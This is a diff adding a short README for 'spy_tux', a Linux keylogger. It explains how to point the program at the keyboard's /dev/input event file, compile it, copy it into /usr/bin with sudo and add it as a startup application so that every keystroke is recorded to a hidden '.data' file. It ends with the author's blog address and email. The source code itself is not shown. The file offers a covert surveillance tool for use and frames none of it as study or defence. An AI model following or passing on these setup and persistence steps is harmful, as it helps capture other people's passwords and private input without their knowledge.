@@ -1,0 +1,29 @@
+spy_tux - a simple keyl ogger for linux
+========================================
+
+
+compilation
+-------------
+
+add the path of the "event" file of your keyboard (which is in "/dev/input/" folder. most probably it is "event3"), your "admin password", path of your ".data" file and path of your ".keys" file to the corresponding places in the source code and compile it using make commend.
+
+usage
+-------
+
+after compiling it copy it to the "/usr/bin" directory using ,
+
+sudo cp spy_tux /usr/bin
+
+and run it using "spy_tux" command on terminal.
+
+spy_tux
+
+then the key logger will be started. the key strocks will be recorded in the ".data" file. add this command as a start up application to start it corresponding. 
+
+more inf0:
+------------------
+
+	http://www.inf0warri0r.blogspot.com
+	tcg.galahena@gmail.com 
+
+ 
